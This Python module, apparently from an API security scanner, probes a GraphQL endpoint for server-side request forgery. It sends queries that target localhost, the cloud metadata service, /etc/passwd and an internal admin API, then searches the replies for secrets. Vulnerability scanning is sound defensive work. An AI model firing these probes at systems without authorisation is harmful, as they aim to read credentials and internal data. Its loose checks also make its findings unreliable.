#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
from RAGScripts.utils.logger import setup_scanner_logger

async def check_graphql_ssrf(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for GraphQL SSRF
        test_cases = [
            {
                'name': 'Internal service probe',
                'query': '''
                    query {
                        user(id: "http://localhost:22") {
                            name
                            email
                        }
                    }
                '''
            },
            {
                'name': 'Cloud metadata access',
                'query': '''
                    query {
                        fetchData(url: "http://169.254.169.254/latest/meta-data/") {
                            content
                        }
                    }
                '''
            },
            {
                'name': 'File system access',
                'query': '''
                    query {
                        readFile(path: "file:///etc/passwd") {
                            content
                        }
                    }
                '''
            },
            {
                'name': 'Internal API access',
                'query': '''
                    query {
                        proxyRequest(url: "http://internal-api/admin") {
                            response
                        }
                    }
                '''
            }
        ]
        
        for test in test_cases:
            try:
                response = requests.post(
                    test_url,
                    json={'query': test['query']},
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if is_graphql_ssrf_vulnerable(response, test):
                    findings.append({
                        "type": "GraphQL SSRF",
                        "detail": f"Potential {test['name']} vulnerability",
                        "evidence": {
                            "url": test_url,
                            "query": test['query'],
                            "status_code": response.status_code,
                            "response": response.text[:200]
                        }
                    })
                    
            except requests.exceptions.RequestException:
                continue
                
    except Exception as e:
        print(f"Error in GraphQL SSRF check: {str(e)}")
    
    return findings

def is_graphql_ssrf_vulnerable(response: requests.Response, test: Dict) -> bool:
    # Check for GraphQL SSRF indicators
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        return False
    
    response_text = json.dumps(response_json).lower()
    
    # Check for data leakage in response
    sensitive_data = [
        'ssh-',
        'root:',
        'internal-',
        'aws_',
        'azure_',
        'password',
        'secret'
    ]
    
    if any(data in response_text for data in sensitive_data):
        return True
    
    # Check for successful internal service access
    if test['name'] == 'Internal service probe':
        if response.status_code == 200 and 'error' not in response_json:
            return True
    
    # Check for cloud metadata access
    if test['name'] == 'Cloud metadata access':
        if 'instance-id' in response_text or 'ami-id' in response_text:
            return True
    
    # Check for file system access
    if test['name'] == 'File system access':
        if 'root:' in response_text or '/bin/' in response_text:
            return True
    
    # Check for internal API access
    if test['name'] == 'Internal API access':
        if 'admin' in response_text and response.status_code == 200:
            return True
    
    # Check for error messages that might indicate SSRF
    error_indicators = [
        'cannot connect to',
        'connection refused',
        'network unreachable',
        'timeout',
        'dns resolution'
    ]
    
    if any(indicator in response_text for indicator in error_indicators):
        return True
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_graphql_ssrf(
            "http://localhost:5000",
            "/graphql",
            "POST",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())